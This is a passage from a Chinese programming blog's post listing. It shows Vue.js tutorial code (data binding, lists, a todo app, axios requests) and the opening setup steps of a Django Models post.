--&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">        &lt;img v-bind:src&#x3D;&quot;imgSrc&quot; v-bind:alt&#x3D;&quot;imgAlt&quot; v-bind:title&#x3D;&quot;imgTitle&quot; height&#x3D;&quot;400px&quot; @click&#x3D;&quot;ToRed&quot; :class&#x3D;&quot;&#123;active:isActive&#125;&quot; &gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">    </span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">        var app &#x3D; new Vue(&#123;</span><br><span class="line">            el: &#39;#app&#39;,</span><br><span class="line">            data: &#123;</span><br><span class="line">                isActive: false,</span><br><span class="line">                imgSrc: &quot;&#x2F;img&#x2F;orange.jpg&quot;,</span><br><span class="line">                imgAlt: &#39;vue-logo&#39;,</span><br><span class="line">                imgTitle: &#39;这是你指定的title&#39;</span><br><span class="line">            &#125;,</span><br><span class="line">            methods: &#123;</span><br><span class="line">                ToRed:function()&#123;</span><br><span class="line">                    this.isActive&#x3D;!this.isActive;   </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>



<img src="https://i.loli.net/2020/04/26/bEMpBuDc4Szkv29.png" alt="image-20200425202402366" style="zoom:33%;" />





<h2 id="2、图片切换"><a href="#2、图片切换" class="headerlink" title="2、图片切换"></a>2、图片切换</h2><ol>
<li>图片列表使用数组保存</li>
<li>v-bind指令可以设置元素的属性</li>
<li>v-show和v-if都可以设置元素的显示状态，频繁切换使用v-show</li>
</ol>
<p><img src="https://i.loli.net/2020/04/26/SotjdsGHMUaWhrz.png" alt="image-20200425203317172"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">        &lt;a href&#x3D;&quot;javascript:void(0)&quot; @click&#x3D;&quot;prev&quot; v-show&#x3D;&quot;index!&#x3D;0&quot;&gt;上一张&lt;&#x2F;a&gt;</span><br><span class="line">        &lt;img :src&#x3D;&quot;arrayImg[index]&quot; alt&#x3D;&quot;凉了&quot; height&#x3D;&quot;360px&quot; style&#x3D;&quot;align-items: center;&quot;&gt;</span><br><span class="line">        &lt;a href&#x3D;&quot;javascript:void(0)&quot; @click&#x3D;&quot;next&quot; v-show&#x3D;&quot;index&lt;arrayImg.length-1&quot;&gt;下一张&lt;&#x2F;a&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">    </span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var app &#x3D; new Vue(&#123;</span><br><span class="line">        el: &#39;#app&#39;,</span><br><span class="line">        data: &#123;</span><br><span class="line">        arrayImg:[</span><br><span class="line">            &quot;.&#x2F;img&#x2F;1.jpg&quot;,</span><br><span class="line">            &quot;.&#x2F;img&#x2F;2.jpg&quot;,</span><br><span class="line">            &quot;.&#x2F;img&#x2F;4.jpg&quot;,</span><br><span class="line">            &quot;.&#x2F;img&#x2F;5.jpg&quot;,</span><br><span class="line">       ],</span><br><span class="line">        index:0,</span><br><span class="line">      &#125;,</span><br><span class="line">      methods: &#123;</span><br><span class="line">           prev:function()&#123;</span><br><span class="line">               this.index--;   </span><br><span class="line">           &#125;,</span><br><span class="line">          next:function()&#123;</span><br><span class="line">                this.index++;</span><br><span class="line">          &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">&#125;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2020/04/26/3mlBWwS2jeYLO7D.png" alt="image-20200425204825246" style="zoom:67%;" />





<h2 id="列表循环"><a href="#列表循环" class="headerlink" title="列表循环"></a>列表循环</h2><h3 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h3><ol>
<li>根据数据生成列表结构</li>
<li>数组经常和v-for结合使用</li>
<li>语法是（item，index） in 数据</li>
<li>item 和 index 可以结合其他指令一起使用</li>
<li>数组长度的更新会同步到页面上，是响应式的</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">	&lt;li v-for&#x3D;&quot;(item,index) in arr&quot; :title&#x3D;&quot;item&quot;&gt;</span><br><span class="line">		&#123;&#123; index &#125;&#125; . &#123;&#123; item &#125;&#125;</span><br><span class="line">	&lt;&#x2F;li&gt;</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">'#app'</span>,</span><br><span class="line">    data:&#123;</span><br><span class="line">        arr:[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>],</span><br><span class="line">        dict:&#123;</span><br><span class="line">                name:<span class="string">"ZEN"</span>,</span><br><span class="line">                school:<span class="string">"UJS"</span> </span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<h3 id="v-on补充"><a href="#v-on补充" class="headerlink" title="v-on补充"></a>v-on补充</h3><ol>
<li>事件绑定的方法写成函数调用的形式，可以传入自定义参数</li>
<li>定义方法时需要定义形参来接受传入的实参</li>
<li>事件的后面跟上<code>.修饰符</code>可有对事件进行限制</li>
<li><code>.enter</code>可以限制出发的按键为回车</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 点击Button在控制台打印参数</span><br><span class="line">在输入栏敲回车alert字符 --&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;button&quot; value&#x3D;&quot;Button&quot; @click&#x3D;&quot;doit(18151908742,&#39;ZEN&#39;)&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; @keyup.enter&#x3D;&quot;sayHi&quot;&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">el: <span class="string">'#app'</span>,</span><br><span class="line">data:&#123;</span><br><span class="line">    arr:[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>],</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line">        doit:<span class="function"><span class="keyword">function</span>(<span class="params">p1,p2</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(p1,p2);</span><br><span class="line">        &#125;,</span><br><span class="line">        sayHi:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            alert(<span class="string">"Hi Vue!"</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<h3 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h3><p>获取设置表单元素的值，双向绑定，修改任意一方，另外一个也会被修改</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- h2标签的值会随着输入框输入的而改变，由此可以得出，v-model的改变是双向的 --&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; v-model&#x3D;&quot;message&quot;&gt;</span><br><span class="line">    &lt;h2&gt;&#123;&#123; message &#125;&#125; &lt;&#x2F;h2&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">el: <span class="string">'#app'</span>,</span><br><span class="line">data:&#123;</span><br><span class="line">    message:<span class="string">"Vue"</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>





<h2 id="3、记事本"><a href="#3、记事本" class="headerlink" title="3、记事本"></a>3、记事本</h2><ol>
<li>列表结构可以通过v-for生成</li>
<li>v-on结合事件修饰符可以对事件进行限制，比如.enter</li>
<li>v-on在绑定事件的时候可以传入自定义参数</li>
<li>通过v-model可以快速设置和获取表单元素的值</li>
<li>VUE是基于数据的开发方式，JS是基于DOM的开发方式</li>
</ol>
<p>新增、删除、统计、清空、隐藏</p>
<p>增加list条目</p>
<ol>
<li>v-mode把需要增加的信息双向绑定</li>
<li>添加键盘敲击事件响应，回车调用add方法</li>
<li>v-for遍历todo列表</li>
<li>push把元素添加到数组</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; v-model&#x3D;&quot;message&quot; @keyup.enter&#x3D;&quot;add&quot;&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &lt;li v-for&#x3D;&quot;(item,index) in todoList&quot;&gt;</span><br><span class="line">            &#123;&#123; index+1 &#125;&#125;.&#123;&#123; item &#125;&#125;</span><br><span class="line">        &lt;&#x2F;li&gt;</span><br><span class="line">    &lt;&#x2F;ul&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el:<span class="string">"#app"</span>,</span><br><span class="line">    data:&#123;</span><br><span class="line">        todoList:[<span class="string">'起床'</span>,<span class="string">'吃饭'</span>,<span class="string">'睡觉'</span>],</span><br><span class="line">        message:<span class="string">'写代码'</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        add:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.todoList.push(<span class="keyword">this</span>.message);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2020/04/26/PKOHCLvVtYqyelF.png" alt="image-20200426103003221" style="zoom:50%;" />



<p>删除</p>
<ol>
<li>删除时传入下标</li>
<li>splice参数</li>
<li>v-for的即时响应</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-model</span>=<span class="string">"message"</span> @<span class="attr">keyup.enter</span>=<span class="string">"add"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"(item,index) in todoList"</span>&gt;</span></span><br><span class="line">            &#123;&#123; index+1 &#125;&#125;.&#123;&#123; item &#125;&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"del(index)"</span>&gt;</span>x<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">del:<span class="function"><span class="keyword">function</span>(<span class="params">INDEX</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//第一个参数是从哪删</span></span><br><span class="line">    <span class="comment">///第二个参数是删除几个元素</span></span><br><span class="line">    <span class="keyword">this</span>.todoList.splice(INDEX,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>统计</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">v-text</span>=<span class="string">"'当前待执行的事件有 '+todoList.length+' 个'"</span>&gt;</span><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>当前待执行的事件有 &#123;&#123; todoList.length &#125;&#125; 个<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br></pre></td></tr></table></figure>





<p>清空</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>当前待执行的事件有 &#123;&#123; todoList.length &#125;&#125; 个<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"clear"</span>&gt;</span>Clear<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clear:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.todoList=[];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>隐藏</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">&lt;!-- 数组为空的时候隐藏计数和Clear按钮 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span> <span class="attr">v-show</span>=<span class="string">"todoList.length!=0"</span>&gt;</span>当前待执行的事件有 &#123;&#123; todoList.length &#125;&#125; 个<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"clear"</span> <span class="attr">v-show</span>=<span class="string">"todoList.length!=0"</span>&gt;</span>Clear<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>我就不写CSS</p>
<img src="https://i.loli.net/2020/04/26/c9atRywnBOrAu6N.png" alt="image-20200426105839079" style="zoom:50%;" />



<h1 id="网络应用"><a href="#网络应用" class="headerlink" title="网络应用"></a>网络应用</h1><p>Vue结合网络数据开发应用</p>
<ol>
<li>axios必须先导入才可以使用</li>
<li>使用get或post方法可以发送对应的请求</li>
<li>then方法中的回调函数可以在请求成功或失败时触发</li>
<li>通过回调函数的形参可以获取响应内容，或错误信息</li>
</ol>
<h2 id="axios"><a href="#axios" class="headerlink" title="axios"></a>axios</h2><p>网络请求库</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"https://unpkg.com/axios/dist/axios.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">axios.get(地址?key=value,key=value).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>)</span>&#123;&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;&#125;)</span><br><span class="line">axios.post(地址,(key=value,key=value)).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>)</span>&#123;&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;&#125;)</span><br></pre></td></tr></table></figure>



<p>axios的两种请求</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 官网提供的axios在线地址 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://unpkg.com/axios/dist/axios.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">        /*</span><br><span class="line">            接口1：随机笑话</span><br><span class="line"><span class="actionscript">            请求地址：https:<span class="comment">//autumnfish.cn/api/joke/list</span></span></span><br><span class="line"><span class="vbscript">            请求方法：<span class="keyword">Get</span></span></span><br><span class="line">            请求参数：num（笑话条数，数字）</span><br><span class="line">            相应内容：随机笑话</span><br><span class="line">        */</span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.querySelector(<span class="string">".get"</span>).onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="vbscript">            axios.<span class="keyword">get</span>(<span class="string">"https://autumnfish.cn/api/joke/list?num=3"</span>).<span class="keyword">then</span>(<span class="keyword">function</span> (<span class="built_in">response</span>)&#123;</span></span><br><span class="line"><span class="vbscript">                console.<span class="built_in">log</span>(<span class="built_in">response</span>);</span></span><br><span class="line"><span class="actionscript">            &#125;,<span class="function"><span class="keyword">function</span><span class="params">(err)</span></span>&#123;</span></span><br><span class="line"><span class="vbscript">                console.<span class="built_in">log</span>(<span class="built_in">err</span>);</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">            接口2：用户注册</span><br><span class="line"><span class="actionscript">            请求地址：https:<span class="comment">//autumnfish.cn/api/user/reg</span></span></span><br><span class="line">            请求方法：post</span><br><span class="line">            请求参数：username(用户名，字符串)</span><br><span class="line">            响应内容：注册成功或失败</span><br><span class="line">        */</span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.querySelector(<span class="string">".post"</span>).onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="actionscript">            axios.post(<span class="string">"https://autumnfish.cn/api/user/reg"</span>,&#123;username:<span class="string">"ZEN"</span>&#125;).then(<span class="function"><span class="keyword">function</span><span class="params">(response)</span></span>&#123;</span></span><br><span class="line"><span class="vbscript">                console.<span class="built_in">log</span>(<span class="built_in">response</span>);</span></span><br><span class="line"><span class="actionscript">            &#125;,<span class="function"><span class="keyword">function</span><span class="params">(err)</span></span>&#123;</span></span><br><span class="line"><span class="vbscript">                console.<span class="built_in">log</span>(<span class="built_in">err</span>);</span></span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/26/bcCtkLqJVaMUKnG.png" alt="image-20200426112053877"></p>
<p>vue+axios</p>
<ol>
<li>使用axios获取API返回的数据</li>
<li>this传递数据，交给界面显示</li>
<li>axios回调函数中的this已经改变，无法访问data中的数据，可以先定义一个变量把this保存起来</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"Get请求"</span> <span class="attr">class</span>=<span class="string">"get"</span> @<span class="attr">click</span>=<span class="string">"getJoke"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"(item,index) in joke"</span>&gt;</span></span><br><span class="line">            &#123;&#123;item&#125;&#125; <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el:<span class="string">"#app"</span>,</span><br><span class="line">    data:&#123;</span><br><span class="line">        joke:<span class="string">"一个笑话"</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        getJoke:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> that = <span class="keyword">this</span> </span><br><span class="line">            axios.get(<span class="string">"https://autumnfish.cn/api/joke/list?num=3"</span>).then(</span><br><span class="line">                <span class="function"><span class="keyword">function</span>(<span class="params">response</span>)</span>&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(response.data);</span><br><span class="line">                    that.joke = response.datajokes;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(err);</span><br><span class="line">                &#125;</span><br><span class="line">            )</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/26/ijwkU7topQcvsI2.png" alt="image-20200426124533624"></p>

            
            <p class="more">
                <a href="../../http:/ymlog.cn/2020/04/26/VueJS/">阅读剩下更多</a>
            </p>
        </div>
        <div class="post-thumbnail" data-img="">
            <a href="http://ymlog.cn/2020/04/26/VueJS/" title="VueJS 浅知">
                
                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/6.jpg" alt="默认配图" >
                
            </a>
        </div>
    </div>
</article>

    
        <!-- 文章列表 item -->
<article class="post">
    <header>
        <!-- 标签这有且只能显示一个 -->
        
        <a class="cat-link" href="">编程</a>
        
        <!-- 文章标题 -->
        
    <h3 class="post-title">
    	<a href="../../http:/ymlog.cn/2020/03/28/Django(%E4%BA%8C)%E4%B9%8BModels/">
    		Django——Models
    	</a>
    </h3>

    </header>
    <p class="post-meta">
        Jelon 发表于
        <time datetime="2020-03-28T06:42:14.000Z">2020-03-28</time>
        &nbsp;&nbsp;
        <span class="post-tags">
            标签：
            
        </span>
    </p>

    <div class="post-content">
        <div class="post-excerpt">
            
                <p><img src="https://i.loli.net/2020/03/28/KCgP1Rbf6qei5Lp.png" alt="django(二) - Models.png"></p>
<h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>0、首先创建一个Django项目：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">django-admin startproject DoModel</span><br><span class="line">cd DoModel</span><br><span class="line">django-admin startapp App</span><br><span class="line"></span><br><span class="line">项目框架：</span><br><span class="line">-------------------------------</span><br><span class="line">G:\Django\django1.11\DoModel&gt;tree /F</span><br><span class="line">Folder PATH listing for volume tmp</span><br><span class="line">Volume serial number is 1030-3F09</span><br><span class="line">G:.</span><br><span class="line">│   manage.py</span><br><span class="line">│</span><br><span class="line">├───App	# 我们主要写代码的地方</span><br><span class="line">│   │   admin.py</span><br><span class="line">│   │   apps.py</span><br><span class="line">│   │   models.py # 和数据库交互的地方</span><br><span class="line">│   │   tests.py</span><br><span class="line">│   │   views.py # 写业务逻辑的地方</span><br><span class="line">│   │   __init__.py</span><br><span class="line">│   │</span><br><span class="line">│   └───migrations</span><br><span class="line">│           __init__.py</span><br><span class="line">│</span><br><span class="line">└───DoModel</span><br><span class="line">        settings.py</span><br><span class="line">        urls.py</span><br><span class="line">        wsgi.py</span><br><span class="line">        __init__.py</span><br></pre></td></tr></table></figure>



<p>1、在<code>DoModel/DoModel/settings.py</code>中加入应用</p>
